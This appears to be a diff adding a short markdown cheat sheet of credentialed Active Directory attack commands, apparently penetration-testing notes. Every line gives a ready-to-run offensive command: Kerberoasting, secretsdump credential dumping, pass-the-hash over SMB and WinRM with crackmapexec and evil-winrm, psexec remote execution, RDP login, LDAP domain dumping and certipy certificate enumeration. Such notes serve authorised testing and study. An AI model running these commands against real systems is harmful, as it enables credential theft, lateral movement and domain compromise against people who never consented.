@@ -1,0 +1,32 @@
+- Credentialed
+	- Kerberoast
+		- sudo proxychains impacket-GetUserSPNs DOMAIN/USER:PASS -dc-ip DC-IP -request
+	- Secrets dump
+		- Password
+			- impacket-secretsdump USER:PASS@$IP
+		- NTLM Hash
+			- impacket-secretsdump -hashes ':NTLM' USER@$IP
+	- SMB
+		- Password
+			- crackmapexec smb $IP -u USER -p PASS --shares
+		- NTLM Hash
+			- crackmapexec smb $IP -u USER -H 'NTLM' --shares
+		- If C$ writable
+			- impacket-psexec DOMAIN/USER:'PASS'@$IP
+	- Winrm
+		- Password
+			- crackmapexec winrm $IP -u USER -p PASS
+		- NTLM Hash
+			- crackmapexec winrm $IP -u USER -H 'NTLM'
+		- Connect
+			- Password
+				- evil-winrm -i $IP -u USER -p PASS
+			- NTLM
+				- evil-winrm -i $IP -u USER -H NTLM
+	- RDP
+		- xfreerdp /v:$IP /u:USER /p:PASS
+	- LDAP
+		- Password
+			- `ldapdomaindump ldap://$DC-IP -u 'DOMAIN\USER' -p 'PASS'
+		- Certificates
+			- certipy-ad find -username USER@DOMAIN.com -password 'PASS' -dc-ip $DC-IP -debug -scheme ldap
